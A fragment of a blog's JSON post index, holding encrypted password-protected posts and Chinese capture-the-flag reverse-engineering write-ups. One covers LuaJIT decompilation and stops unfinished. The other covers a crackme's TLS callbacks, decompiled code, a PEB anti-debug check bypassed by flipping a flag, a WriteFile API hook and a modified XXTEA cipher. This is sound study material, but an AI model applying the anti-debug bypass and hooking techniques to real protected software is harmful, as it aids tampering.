a9faadac13e2c0a484fdd2db22ee2c41c9764dc194f9a7214021c5c6f25859b63d77c74bef3da9fe578940bfda5488e26b65880b140bd7c357cebe5c85a6a545604be496c49cade5c4e77f780b85ee7073762b76ddb4ab8436ededc7df52a8b7601eb331361b4a5236192f9c8d47bf1e69a09804027a69fe13ccb2fcd5a6ddd7758f1138ad638c3e820442a5059124051b3b41bad5f86a47bd133eda8f5b98c2168d0d0074a7a700345396d55e4de3f19b84d95c986bdb9fa445dd3805864764e2ac222b41d470b0fb1efe88d4dc38b0328b520773c19960a0b050b699964a75ab45a748d284ed7e9305ba51d197d5f512daf3039e5c4852b37f71b8bf6e01cfff3ac929241a51d905997dc93aae43561fdf31091afe5a72287d2fc5b0eca45b33b960b585eecdcd4d7cede32d1b3e75fe8f9ce612bcc4962011731a0116f4e56385445cc0de17120a316725ea0d17c16c103d3c32c9c34d0400f02f1eccbf8055052a49e0267d704ae977f60678cc0630e527159cc859ad4f6d35c51c90e3a2476521fdae68650fd9abac3b2671efaac5cbb280829d356d6ff9305065c87129325788e4fcd6a39468b5d62b87c513e1583e037d54f0d4aa20bf26784c153c3b336415e23512900bdfab80994baf9001cd2042b247eb350e538890720dd5e57e0a8df3a2e88458f841f947fde64eab3fc2462e01a4560e2088505e3293a3a9ade04dbf0bad6a890d280b6feb24416a4d5dba4343a2dcf341de0862e46797811b512fded69fa52cdfecab0d1ddc0ab11be59b6682a125a702ea52fc7fad8b52146134251a81aadc4edc2bff01316fb7210b0abab334305e6f97d4761034d68b4f29302641e99947141e5b60acad07a793715c641be178d1ccbae6516838b3cd87a3cedc6d5c9b4396d5fca8c0edaff67d6a5ac6de9f79822687c5a5f18a615cbc64f97cba0bf6acf89ce68c05e98ba90c88435c19dc0a6c7db6cde2aa843bc600ca555c546039da36be5cba00bc1377f984eddb7769419346468b13ce1a4cc1823c38af05eeeccb7eb064fa0be4ca57add90618e27e279f1174e4c47792e755c8309aecc12cd42475050194a3e7063f6c4bb3d8b322a198a13553fb714761f5c4b4db963164e60618e2a7f5c400f9afc916dd936f2d4743edd222d11bdf8c99acb32ee21c87aa1a939fcfebace1e62d46c61c095f269f8a0cfddc809ce5bc7a2344571eb17414a5c38cbb2bdb1b39e3fab33a76d76525d25d3913805994849f4619d882d63840f15aaf89746fe91810a30b849fe33a55362f44afb37bc227d31530ad7608ee4be2ef8db821022687fca8351bb26b6d2114182804702339009638bb8cb3da04e8607c0ac7c86819f2d6161177b3f5042ae2ed390a55a2eeeff4c3b538a725e1c17c186d099cbbdd7e4e8f9e9f14f425daf07152ea6b36a24f75594c8488ad0d78b7168e5481dab24ba4feca36a995697a38f627e4c5ee2a3298419d817d810a73e7c139d38ba9c69bd262eaec320a09cd65fbe661c238c0d28a24f718e9dfd068ccd2f0c5fb731d549abd2b4e6e8fc3a0574299e260a3a442133d4d724392ece7ca32a87dbc2de0469788e7100e3002b6b7f515637dce053bd72fc9300fe483713b344d1b73c59e73f5da9ce92b2a2a6f147553811701c4d3ccdfa237c3e6cb8315d259e4d974a78d78aab843d385a5891e4c098836abf3b2fce9c7c6d5a8cd6d198fd70afddfdd4deb0bb51cf80ea8e6ace5bdd3c41b3c3513000ba304d8bd8061303911851efeeac149c614340c5377869da1d1d5e483c7362e7486e18f1e87015dbde630598190a91f975f4084606da478e756180d580829c0b3c238ab58a1a390e2b1b8c664e05a3e40de4db972815f3d3d1e450c6b9f5f57a18e4ace0860dfb02251275e855d96e931cb22093eb58c93b8b6f2b731ea76f726defce55b54636e4fa9ff459473b794e1983a15835e35228058fe75ae14be88c8340eb576a9383aeaa4e293da46210d6ca76050f5c68f80a792a3d4302ecc0f1261777a685d2785b73704c49c5f7c767d08c1d842b24619607d0ab282467479aef464d5d49415c08f1c144fe0f4cd4910c24cf25f7b3e14dba048441a6640a1feb6490ad72536a822057debc1df38ffd28b7cb8c9de5967421d0096a063e25cc10342df1633a7567afd4a222a076400ecc7030d0fd50be8f3d06b905e9071e533f5deb24eeba2f1c869070f3c306c05812ae3c0cc95e51ffbf4c3f774e8ab8f76bbc1fe7b1c7402c4c6fa24d21c9647b76d6bd82b0324737a552f926c9e3aa9e67d82847fd78588a3f29b6e57336a0d36d54ec5a5ddf555327b5ddc4b15705f65f290538e0c72f5892ec5ce926b95883256758a5ee220d61c1ead0352f567f110271c80c923395efc97c2a0d47b8969f7b95ed3ccb09f48fb26c441ce7bbd367f47a8baee6b289f1f250bcfb932e9689dd73c00ea6e0ad33e04b660c44571723c219a2f888508f2e6f00133f92c1f30ee7374bcc6fd595d57b2317fb06ffe01de351ece71bba20821fe643cb98401cc019e71f0f071f9e94b6dcda231ad131d70af2535b7f969379db498dd2eaf66f0fbf3916ec9e51e8b4a22886e1d537e2457f3b63647ccb69340514f5a9be6bb070bb3c3183924b10071aad6db16808ec3945c3eb5295b3f25179331fad2117bf30713475579862283d4835d46047fe996266ae4859ea791c74725ea0c3d45955646d47fff0af4ae47b54de8ab733a64da095c595fc06d083cb6470f0a51d15fc7ce1e74b4133c4b1cde5fd47cc03c2b86227a04e225611f485353f4be61c84739bb19dfe490502022c6f111dd87350f9508acd85d26372efa68e7fe1fc317ca694b2908b40d5395abd237236313828267f8293951e09039ac76c7c53cd9e2da9050154afe83d0ecce38858b9f0dae5d28def9a607a78de92ecd7a0ae4372157df74bef2af07c3c464240dcbdd1e191d8859d6277aff0e5f7d44fed3919ee59bc3e792c4a1447bfb29cd769f5d48b6bf6c490da534abdff6ccde4c7c32e26573472723a6a58165de34a9ff9bcc1cbdb9ddaadcc807b71017e6beedbd40db094fe83ecac1e59bbb0ac1c3f9141af87d887fea8735e6283e8c62e05fa0e854f1edf29b6a999a11c7d9c73bdfe1a52689843e7679d165f95ea99dac9a0d2e743dc07447961fbef670dd6a42d8e6005578f42be714fb210614a65fd3990dc86575b09fd7450d54a312cd12a4f72d7e032eb9afa0d5a836319eb8bf13d484b2fb03d5593bd3db5862d46f3de39dceefd96331b17e1f9797d3af9e727ec28d336b3118483302829f9e3e0b7a352de688ab9b799579fb32e9f95a269492799d92c62e05a308015a654cf65e979aefe060272bf279f2061ba68f7aa85d2ccc754dd3a04e5221d5b0b6f96343db05fe5c11cfeec57e86759b3e05d08869fb29aaf8d0bd365ecfc54728208a02bac2a2efa8ba4a928152b2603edd6a79c0fab0cc67bd7d491e910c039acb7bda1ac24615896cbfc53f14466a1c9912ef571d3705345eeb0e1214509fb4e476736d26517d9dc91be3ab668a8346ba216c50295ce1da1a462118b39c2c2a71789a58e85f41da9f0eba90d8cffbeb1f6a332e1c9c27e0740ed2172b69a28e9a94a0c601b196904ec5d5e732a7cd2b9e4e1bbcb1abc6ba327f944fe6507dc94c576a739d898ff235f59a9eb4701316e1a807d4bf3f307ec63b1bb950279c90827141deb9aa72ef6e3120c9bb7efca892bb82828cdf6800181f7c4eee6d13d2cc86ff23e9cf321aa302854ca67fd02ee20967d6c6081c058c7f2bc9d873fd4825b58ccf62071db83e30f1291090ec66e29b83b5e601cf4cc36f149591bc441d46562154c49c17aca9105399557184f8a1cce61488978cbd5a546793a3a80df64fc471cb4da7bf0e6e3dd254ac598b37c4a4cbabdedb84f0f3a5dec83e1658e7357f52079a4ec67dd060114da4e80ad9f097fca9568705f963c37f33288681ec2a8053d4fc09c8108adedd0503161c7dd9db4bd52d9c224f326e96e7cf7c99c7326a17298e8742ba52aaf8eae86382dbf4862cb9b6a7cdca72ac877d6b93bb44340243c3b04035af5571aeb3422e89e21d4dccc24332ccb7050c7e6b607ce50c578906f554c0eb49d0521dc4e9af58ebda84e354dfcf74cc37a88e6cbfc62d2eafc9f8aa815b3f767389e23fd0a47625743409ae06dfada65eae3555a96c60a38131963ce73e43dfa331e140c44532d95f2f8c4a1cf916b494e5faf133cfedf34084598c084708f979659dce8b73726ac68b243dd369411b2c4d1690a403ad20e402b646c15530b194a063b2f6b59b3cf27c374715821dbb1ff0dce3b7eb5a3395274154f0afcba2726c572a9faae9d22df17073713c16783b207a23de94bf557db7ef371588f2def1f7cde8924c84aa584c1fada820516090b76acb5cc02f2b9bbc7ebbc1db7bded09919277da7ef79c9d25e9aea0bb81f624b214214b8e5fda80e83c03afd758e4d5f266c16bd459a3862a615ce74fa7da69250c090d1e01a53ca07e3a3fa5d659b63468924a4a9c8519ae9fdd8bbbe05c482694ae777269c3343e3b116a1cbce0f88ffff09037ddc8611fcf2f530592bca0224d0bdfda4434321601f4ede3e070c3fd18592309d49798b43b12ac90098e0379a229068344fec60fae1c6458a86dec363da11fb42c5b40daad46a38c71e1e3d283a1621026934d9967070c7de45c166d44af4a8aaf653be61c481d2bcc73b65db36c77661adf1653cb998a7c45dcbbe65ff894b67f685665f93d4c93f7b7e84bfb9d4fbba172b34ff5ee0822cacde7d6a159775ac9a2c49a0466c78baa3d41d27ac49af75a68e93308113b1d38a82434862b06096dfafb505f08f054d0097394094e84d3537104d955ebbf5cc6eb7c5f23a17b4031dae8b4f55b002d04c356d0d8da618ddada278265707a83a45b3f5b97279b1cd131e65fc1087e66b746c13700102fd88c4c8b47d5c5433ca6b9f66d7f7080a2528c015523f1cc87d8d17b9edbb46fc1f040aa83e0dc3f49e44941cfef3f97315af802864f7efddace1cda794fb299444a4686387283eba6a4ef19ae51070f1417d25d5977e52cfb983004fabc441813a20392eb300668741043b285af02b8d17d95635673199e715e0de6d3525d9083ee9c5fe06c0f0b44bba5cd531fd3169c2f56a0ec4e2464382b521afafc30ea93102316148cd96ce7146aeb31bce93d3729d1dc7d6160c66f4f87e8da855c3d4d9d1737e6bff3dbf8280a419bb865efb4bd4a54a6aefd90d3bce042e8dde956e6f7167d9aaeba7b61437a9cb3b572be6fbbabe68d79c3b74349e5c200a8c60c7afb54c010e81ea23c5702dd08e90f0d891204214b833f6ada80198042c3eda66a0106928bd0f85454782f5229592a9b5f4ea2fa723aa34af68b3434df6a6045e31358ae911becccd9e960d8126f02e3d4b42f32e6b37ccc36ab1008422bfc90e8994968d5afa7b9c91defcbe896d9d4b174b54987281bf14189780bb5fed1a0b1edfce523e04649c6e0286939b45baea5b2237b73be1f76a79c0836b651567bade637c7ec5ec98548cab45a4c9515c13b309bf2d2b22c71c233a37bcbc82ad0df8219e355a97fdabd70d76b314d85a9c03f9d214f66c1f51732d297f1aec61f1a4fa586cd1a6c614c9fcbeaab47e152a83acd00d28570924c70d45c20363f7534191a7c8c9b632f9786e7ce14323994f0889539572e054cf5875c8434d9d51a735b0eb74d7d0332abce4ad38d167e5891f1dacf8a4d8604ae73d4cf25f7cbf1c1e3be7bedf3c6875b7c6fb9bd3762147955974d000cf3664251d84536788193cabe93a9b6ae6676fc23c15641a20b862eaf6ac0ed7a80729f1e63f62ca90fada447ca65f3cabaf7bc2aa553e081045cb9cf661619f365d39683ada49277b90a21901139b9665dcb2be9413674738a6adc23a7fe390f5d4715acb97592f5bc13113cdbcdce054b689614343a663ff52dc269c5a12939c427c975c500fd53c91ded2c591c6afa9468000c7d5c8e5bf0b848a422ec300aa70263e713e5c14c23e91d8d0792e193754ca39391bba7fc6d9cf5fbb3da470b6250b1ad11bfba4c553cd524497730007037ff4a6920ecb4564fd430bc4b4e90a12c6862a7098880091d8524dd254c9b0aee5eb05846d4e42c03ab848d9e462c597ba31c1e039a3fdbb6066719063f7eb300fdd704c87c2ea82255a0075ee911689b0758f691bd80ea28dd93246f6b8bcacda947022ca1cfced15a9f7202ffc0172ec57330b206a05ee91a1f86b858c3d91b7d2ea8262f35c3ab7e1bc2eb01da97081da89dbaeacc587ac511424c1df890634bd4417c2ad77eff017e32bf5e313630b521d900e8963feeafc4d0ebc925be1d0179a84a46d3990ed43d84665c4a60ad0d1d72c6b7abfe708f343488b87fd1756c497f93eac726ed38d0135c8b1780319e2a8da21114b72d9205d12e05ba1d80126244f9e1f1a15034e8ee7311c9af332b431c6ed802305323f682945c19a2664d680ced0b58b69043d2db7bdb7232859c2c87f6307baa925394738145eb83fef9dacb3da79ac67929c913981ea1075a20ea08b0863a7bca36a242f4ab22afb49baa6ea0b0bae749698754fe686db9208e3b7abd422f7f9986587cd4489f34b78ad66eef4e36485c111d551e1fcf086de87dbafa0cdca2ebd8b6dbd483ee0bc7ca99fbd8071ebe5825d77bda2014f31d9ce17afa8e0a376d9b2b0bca0e4a845786fb2195828841971082a6c594b4309f1c54c0a907c3054bd20f2d2e7cf796e6c7ec9d6ac50d9915e8bbc31700ed8061cb3b22ce5f8f8beedc421c03c757580060167f505a426144d5e426c437e85aace656cf062238b579b6e72a33e7669b1aa3cd585804cd3c556e822dafef808e826a682daa86557b764a21ba0d7e8b1997ca581cae5708484b147cb65754b12f3b3bb3a4051e75ce7a84f838ecd6b40f37d20ced4904813bd7810ce13667afaf6959b38f2321c0220c6113e9665439152eb668e6e9927ffb5b6338ad4f40f10ee3c4cf4afa352ecb97df7fddabdf96f809680bf41591c0dc93253d81b64448f5c079b4f660485411bd61ad853a5e631d126b790bfe159df6e9d3d9d0239032181b6a030b16ec31646cf4db09f20e8df843b3c47e3ec42aa1f40537135d89b6fcb060ef5503dd4c675af2b6f0172027a88164aeb3e74196e5e627143b3c72043175e861a418f09d61271cfb777ff10fbe8c7f1532e5ac89fa4e300b7db9e5771f73d2a3c98bb5eac042c74fe5aa9de7fdff4c1b3758f333620ff93314441619b125e19553b4c371cbfe130351a42ef1d5c28e185f2ab540de97f7076a3c48ceaf7ed8f2b9a3a8ba4a02e6f7cd8c191be0d59d46cb129112e41f03e8593c2c4277da3f2326c600e0b66b6c0656e4ec0c1b09b8a6ee3fc54b9826f0be045220da5b21e0db1cd43e247a0be253c2682a3385a525429e9f0ce299b3601fd869b69b68bcfd5b24ead8d9708d01a9fe69294fdef846c0b091961b803095afdcd13d5469d58c6ba02b6c35628cd98cb8ef8f2330a893fa8f76cb8dedb41b48945a12d73bb72eeb9cf7e805bd8289a2acb028785904c5cfebbf94da40327545f18165ec7923a3e4289bf29f964df179741b89e31c22ee0f3a1a928a87204db88b1f683a698bdb8ea758bdfeb6ed90cde1faa0a507aa4d8b37a85315ac515ab60a970225c6c3a0dd3777b356f5569ae95acfbee1b0ada2ee424970732beb07a7bfcf5e1988589960bfdf2984680163fc274ea662a782516bb7ef6a3820d2bb7ad3601b4230683f43af1c2762eca75adcd6995be2bb047e1713349fb988605a1c343b411a4099094e32ede40850587c3317c76167d2e4420aa5b0a7ca47be50bc434d03d68b690a372db08b1da0210641b7c7d9a162ef6f4e3ebfe0ba54e14b2c256c512e2d2fb600f1b1ddb19740bf056b61e9d7a9018eb844b5d6389a657bd658dc8b27adfed3f6c08631e9913f02579a72639ec4000def1211fdb2134f939c27c6e0bfada711d96389d9135f1d3af31a8db96814e0b972916bfb99f85a9ff63302cff15f8056999ce715e12c4e4aeef41a1d08299ebe89ebc093dcee6379fd1c33e48ab2622835ef88dcc4c36e371d29428a4cc79246 您好, 这里需要密码.","categories":[{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"解语","slug":"解语","permalink":"http://example.com/tags/%E8%A7%A3%E8%AF%AD/"}],"keywords":[{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}]},{"title":"Hack For Fun","slug":"Hack-for-fun","date":"2022-05-28T16:00:00.000Z","updated":"2022-08-25T12:41:38.169Z","comments":true,"path":"2022/05/29/Hack-for-fun/","link":"","permalink":"http://example.com/2022/05/29/Hack-for-fun/","excerpt":"有东西被加密了, 请输入密码查看.","text":"c516531d8dc397363af3dbbf8b155c576f834e3abc39fcec9d221cfb2863b6d71b888aee3b0127e306aea9980fcec5bf755faedcb0af6e6f6accf6daaba2a129db809978b8d02c3f612736960ecb3baca264a27d9db697eab269079b16033015a97717d27c0514715444803dccec8631c6ff24fa95fa34634dc60f14c3cc5515411e37a2ce64f19b150b8783c5f1bfe4089b740ae3cc41020fa65573fbbf1785e87abc6fa6157a08f41fbffa58fd6f604ba645d84d2ff20e7fb9fda0fc6f4365e7f8e535b141a3f1efb4d6e14f76fe38ec70543c51ac68e2eafea34c6e47527c4bc04316de9d5a739b0b1faed3e0522098103df341181b067f691eeaf9cf9fceff464a64c09f509ba0c3ae5605e6367c456c415b89c30ee941dd460c3f4493d064f28b01e181ed93f308f3806d335c6d2de5c761811083a772a48599fec4b728719322d1efc858c9f9257088f23fbb1345b5022ecbd4b3542fa58e5d4ae63b84cfd2ea00464b9f66f2b2eab10a131f4cf2356327ec34c6a425ce65adcf61ae6ad824c5e298d66ccffcbd3995d5c3e3666501084a17594df1733cb586228c595f3195e5643607ac5ed7bb6f0217c2543f022a1d9912acd4489115d4309d36924b597f9ac950c658a580c974db9d72d35d0ad597301b6ee7f836e9cc60c4d2daf8e9a77cfadf14647ca0635b1104ca92105bde6db7f81f888b99e291ba6da33998c5f59a1ad9ecbe999515eb1d7a392e2f6cdced4202b9e2e2bc25f9855c0855ab3b0b9d4759242dd4521759e5d6eb961905508537d181b6b955f6f3d15c352824ac0dea10e387fd4178ab991b875510285e3eed9d3f90b9105e6b23a30defd1d3a42ff1e8eb9fdd23146ecb8c717f436495793a1bd23218196263f6d48fd1605bd3d9f780dc43bce0f0f548052cf9f9e8c747e05b5da6152569063b1d98a66dc9610f3f0ee3c720723692f170f592e640326105934415273689684ede3e7c6d8d75ba2b633a41bb04b08b2f56e4089e1b26b33fecbe97af7e5e50232f600f08f1288a96dce566a585e851b32d1935babbd9d8bc72d68d63295e93c6985853b652399d338d3925a3e1649bde14e031ce536b542a7a227b41453192fd47e43ebaa0e6dcbfe9866b1193fb629184532e5b9cb4b6dcdfe85c41fb81129d154e4bc0c2466a768b87346a27f36f2e98007bffd5e7e5e4a8783111d62fea5d099198923bc4f98d32707b0b85a0b74d6525899ce1c06d346cb079fc08926772da3c2d5e836874ef1e078707a45c7680bf682ca4ad56d6a0a9541ed9c4818d8d40f5972ee920154db70fb9d62a60dfaefa1c1259ce0eb0fa9e7721406c602f7214da727c4bd73484b61a5fe826c97eabd1ff1c21ded4676fe645e55815c669abd3f2bc31a85b20e2ab815d4dfaaaa21600dfe7b891783f08bbac3eda4445eaff57f4d516e8f2e177325655dd5c405adcb132c3a70f7cb747eb40f4361092163ae943d0908d63ae6f802e6df18b10cb689f32677240c53401287f72efa4e7d41791a2c58e59db622d070d7902fab3d83ed53dfcd061f6aad56dab79b94a4858f256e7f0e7fa734d1c9e30f2342e6d8690d3daf274dec21a192bd0408ffb91a942c24d6aa08763e2515f9620d0310728b8ee6478dd250f2d37a6c9c49b7ae22a9d11a938102d42e4f9a5f82fe4fc25467481444a3b29e05526aefd07e5d7c4329f7343c74c2e3a44e8f5924e32aba49d1c69459a582c1541c062647a293f35edde3ecda96fc0701000837383361e883c90067af3e62a9c7c9ee5436d18936989758e61c4a8b6d42ebaccfbe7aed6c7bc8426ef9e47b06d04f21c630aa851614b772713428cad252ed7256868dab397a3dcec2b2982c6d21a4260ac5d5126cd16cfeffcd7d2dfb349fb652ecc45f31e925b213d3be7e6e74aa8811fd9a76f4b558d26bce3583fe716a5b92e235851a98e72db47aa04735c4d50930206d183a0910bc48c27579fc5641e00d6dde08c251c10a8a8667499e2d5c1ae80e2d5126a1eaf13d6999ba82b4561ca4e9c7c2ee0b28da6ef7a1464189b0827670301efa46684cc31103a1e6069c839545942e79293e4b84347c2f494f0152ebc9f4f58d1c5c1d23c5c49b0d6e99902742c507a11a72bbd7e638d3d291c39cde038f9ddcd31bc380ad6aa41ba672dae9e2689f144fad9e1ded690bf 您好, 这里需要密码.","categories":[{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"解语","slug":"解语","permalink":"http://example.com/tags/%E8%A7%A3%E8%AF%AD/"}],"keywords":[{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}]},{"title":"JIT","slug":"JIT","date":"2022-05-27T16:00:00.000Z","updated":"2022-05-29T13:24:49.962Z","comments":true,"path":"2022/05/28/JIT/","link":"","permalink":"http://example.com/2022/05/28/JIT/","excerpt":"","text":"什么是JITJIT &#x3D; Just In Time即时编译，是动态编译的一种形式，是一种优化虚拟机运行的技术。程序运行通常有两种方式，一种是静态编译，一种是动态解释，即时编译混合了这二者。 lujit运行过程： 解题： 得到一个.out 文件，电脑识别成Wireshark 系列文件，拉入WinHex会发现是.LJ开头，可以推断是Luajit逆向。 先编译LuaJit2.1.0Beta3Download (luajit.org) 去官网下载 运行x64 Native Tools Command Prompt for VS （用Everything搜索）， 然后将下载的安装包解压到相应的盘下，然后进入解压后的SRC文件 msvcbuild.bat gc64编译出的64位（题目的64位 msvcbuild.bat编译出的是32位 反编译bobsayshilol&#x2F;luajit-decomp at deprecated (github.com) 下载反编译工具 然后将上一步src文件夹里面jit文件夹，和lua51.dll luajit.exe 放到刚刚下载的反编译工具文件夹里面 然后将我们的题目附件改名为test.lua，再按下decoder_new.exe该文件就出现了out.lua和out2.lua 用sublime打开，就可以开始分析字节码了 未完待续。。","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-luajit","slug":"luajit","permalink":"http://example.com/tags/luajit/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"TWIN","slug":"TWIN","date":"2022-05-27T16:00:00.000Z","updated":"2022-05-28T14:18:24.673Z","comments":true,"path":"2022/05/28/TWIN/","link":"","permalink":"http://example.com/2022/05/28/TWIN/","excerpt":"","text":"TLS回调函数：TLS(Thread Local Storage, 线程局部存储)回调函数，TLS 回调函数的调用运行要先于 EP 代码的执行，并且每次创建或结束线程都会再次调用，故常用于反调试。 可以在节区表发现IMAGE_TLS_DIRECTORY，找到Address of Callbacks（注意回调函数一般不止一个） 题解： 32位无壳 首先是一个虚假的逻辑验证。 在函数栏搜索找到callback函数，但是$+5,没有直接反编译，找到主要回调函数 这里有一个小花指令，最好retn会跳到sub_4019BF,后面还会有一处 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158void __usercall sub_4019BF(int a1@&lt;ebp&gt;)&#123; void *v1; // eax if ( *(_DWORD *)(a1 + 12) == 1 ) &#123; memset((void *)(a1 - 284), 0, 0x50u); sub_401930((void *)(a1 - 284)); *(_BYTE *)(a1 - 1) = 0; *(_BYTE *)(a1 - 1) = NtCurrentPeb()-&gt;BeingDebugged; if ( !*(_BYTE *)(a1 - 1) ) return; *(_BYTE *)(a1 - 32) = 57; *(_BYTE *)(a1 - 31) = 51; *(_BYTE *)(a1 - 30) = 62; *(_BYTE *)(a1 - 29) = 56; *(_BYTE *)(a1 - 28) = 0; sub_4018C0(a1 - 32); hObject = CreateFileMappingA(0, 0, 4u, 0, 0x1000u, (LPCSTR)(a1 - 32)); *(_DWORD *)dword_404448 = MapViewOfFile(hObject, 0xF001Fu, 0, 0, 0x1000u); *(_BYTE *)(a1 - 116) = 47; *(_BYTE *)(a1 - 115) = 19; *(_BYTE *)(a1 - 114) = 26; *(_BYTE *)(a1 - 113) = 30; *(_BYTE *)(a1 - 112) = 12; *(_BYTE *)(a1 - 111) = 26; *(_BYTE *)(a1 - 110) = 95; *(_BYTE *)(a1 - 109) = 22; *(_BYTE *)(a1 - 108) = 17; *(_BYTE *)(a1 - 107) = 15; *(_BYTE *)(a1 - 106) = 10; *(_BYTE *)(a1 - 105) = 11; *(_BYTE *)(a1 - 104) = 95; *(_BYTE *)(a1 - 103) = 6; *(_BYTE *)(a1 - 102) = 16; *(_BYTE *)(a1 - 101) = 10; *(_BYTE *)(a1 - 100) = 13; *(_BYTE *)(a1 - 99) = 95; *(_BYTE *)(a1 - 98) = 25; *(_BYTE *)(a1 - 97) = 19; *(_BYTE *)(a1 - 96) = 30; *(_BYTE *)(a1 - 95) = 24; *(_BYTE *)(a1 - 94) = 69; *(_BYTE *)(a1 - 93) = 95; *(_BYTE *)(a1 - 92) = 0; v1 = (void *)sub_4018C0(a1 - 116); sub_401930(v1); *(_BYTE *)(a1 - 8) = 90; *(_BYTE *)(a1 - 7) = 12; *(_BYTE *)(a1 - 6) = 0; sub_4018C0(a1 - 8); sub_401130((char *)(a1 - 8), dword_404448[0]); &#125; if ( !*(_DWORD *)(a1 + 12) ) &#123; *(_BYTE *)(a1 - 24) = 81; *(_BYTE *)(a1 - 23) = 80; *(_BYTE *)(a1 - 22) = 11; *(_BYTE *)(a1 - 21) = 18; *(_BYTE *)(a1 - 20) = 15; *(_BYTE *)(a1 - 19) = 0; sub_4018C0(a1 - 24); sub_401410(); memset((void *)(a1 - 204), 0, 0x44u); *(_DWORD *)(a1 - 204) = 68; CreateProcessA( (LPCSTR)(a1 - 24), 0, 0, 0, 0, 3u, 0, 0, (LPSTARTUPINFOA)(a1 - 204), (LPPROCESS_INFORMATION)(a1 - 136)); *(_BYTE *)(a1 - 44) = 28; *(_BYTE *)(a1 - 43) = 16; *(_BYTE *)(a1 - 42) = 13; *(_BYTE *)(a1 - 41) = 13; *(_BYTE *)(a1 - 40) = 26; *(_BYTE *)(a1 - 39) = 28; *(_BYTE *)(a1 - 38) = 11; *(_BYTE *)(a1 - 37) = 117; *(_BYTE *)(a1 - 36) = 0; *(_BYTE *)(a1 - 16) = 8; *(_BYTE *)(a1 - 15) = 13; *(_BYTE *)(a1 - 14) = 16; *(_BYTE *)(a1 - 13) = 17; *(_BYTE *)(a1 - 12) = 24; *(_BYTE *)(a1 - 11) = 117; *(_BYTE *)(a1 - 10) = 0; *(_BYTE *)(a1 - 88) = 47; *(_BYTE *)(a1 - 87) = 19; *(_BYTE *)(a1 - 86) = 26; *(_BYTE *)(a1 - 85) = 30; *(_BYTE *)(a1 - 84) = 12; *(_BYTE *)(a1 - 83) = 26; *(_BYTE *)(a1 - 82) = 95; *(_BYTE *)(a1 - 81) = 28; *(_BYTE *)(a1 - 80) = 19; *(_BYTE *)(a1 - 79) = 16; *(_BYTE *)(a1 - 78) = 12; *(_BYTE *)(a1 - 77) = 26; *(_BYTE *)(a1 - 76) = 95; *(_BYTE *)(a1 - 75) = 11; *(_BYTE *)(a1 - 74) = 23; *(_BYTE *)(a1 - 73) = 26; *(_BYTE *)(a1 - 72) = 95; *(_BYTE *)(a1 - 71) = 27; *(_BYTE *)(a1 - 70) = 26; *(_BYTE *)(a1 - 69) = 29; *(_BYTE *)(a1 - 68) = 10; *(_BYTE *)(a1 - 67) = 24; *(_BYTE *)(a1 - 66) = 24; *(_BYTE *)(a1 - 65) = 26; *(_BYTE *)(a1 - 64) = 13; *(_BYTE *)(a1 - 63) = 95; *(_BYTE *)(a1 - 62) = 30; *(_BYTE *)(a1 - 61) = 17; *(_BYTE *)(a1 - 60) = 27; *(_BYTE *)(a1 - 59) = 95; *(_BYTE *)(a1 - 58) = 11; *(_BYTE *)(a1 - 57) = 13; *(_BYTE *)(a1 - 56) = 6; *(_BYTE *)(a1 - 55) = 95; *(_BYTE *)(a1 - 54) = 30; *(_BYTE *)(a1 - 53) = 24; *(_BYTE *)(a1 - 52) = 30; *(_BYTE *)(a1 - 51) = 22; *(_BYTE *)(a1 - 50) = 17; *(_BYTE *)(a1 - 49) = 117; *(_BYTE *)(a1 - 48) = 0; sub_401510(a1 - 24, a1 - 136); if ( dword_404440 == 1 ) &#123; sub_4012C0(*(_DWORD *)dword_404448 + 20, 5, &amp;unk_40405C); *(_DWORD *)(a1 - 120) = memcmp((const void *)(*(_DWORD *)dword_404448 + 20), &amp;unk_40402C, 0x14u); if ( !*(_DWORD *)(a1 - 120) ) &#123; sub_4018C0(a1 - 44); sub_401930((void *)(a1 - 44));LABEL_12: CloseHandle(hObject); return; &#125; &#125; else if ( dword_404440 == -2 ) &#123; sub_4018C0(a1 - 88); sub_401930((void *)(a1 - 88)); goto LABEL_12; &#125; sub_4018C0(a1 - 16); sub_401930((void *)(a1 - 16)); goto LABEL_12; &#125;&#125; 这个函数有两大部分 这个a1 + 12就是对应着运行前与退出，对应DLL_PROCESS_ATTACH和DLL_PROCESS_DETACH 所以总结一下！a1 + 12 &#x3D;&#x3D; 1是线程运行之前执行 a1 + 12 &#x3D;&#x3D; 0 是线程退出后运行 首先会遇到一个PEB反调试，我们直接修改ZF标志位绕过。 然后就是一个异或，将原始数据inputflag混肴。 紧接着读取我们的输入， 输入之后F9进入第二部分 获取WriteFile API的地址 将WriteFile API地址改成自写函数的地址（也就是Hook函数） 也就是之后我们调用WriteFile函数地址就会调用Hook函数（Hook函数里执行完Hook代码就会脱钩） GetModuleHandleA得到WiteFile函数的句柄，GetProcAddress函数获取WriteFile函数的地址存入dword_4043DC，并在sub_4016C0中将这个值修改为sub_401650的地址值。 随后在第二个TLS函数会调用ExitProcess()，也就是退出进程，那么退出进程又会调用TLS函数链，于是又回到了第一个TLS函数，不过这次进的是退出线程的函数块，分析主要函数 这里创建了一个文件，也就是tmp文件，但是对名字也进行了混肴,然后往里面写入进程。 我们可以发现这里的writefile变成了我们相要执行的函数 把子进程的两个值改成6，实践上是xxtea在加密过程中的右移轮次。 接下来分析一下tmp文件。 其中 先判断是否被调试，然后对delta进行异或操作。 hObject = CreateFileMappingA(0, 0, 4u, 0, 0x1000u, Name_FLAG);创建名字为FLAG的文件映射对象，用于进程间通信。*(_DWORD *)input = MapViewOfFile(hObject, 0xF001Fu, 0, 0, 0x1000u);存了内存映射文件，便于后面的共享内存。简而言之，就是创建一个名为FLAG的文件映射对象，把input指向的地址设置成一块共享的内存，这样就可以在子进程里对input这块内存进行修改，实现加密。 一个魔改的XXTEA加密，z右移5改成了右移6位 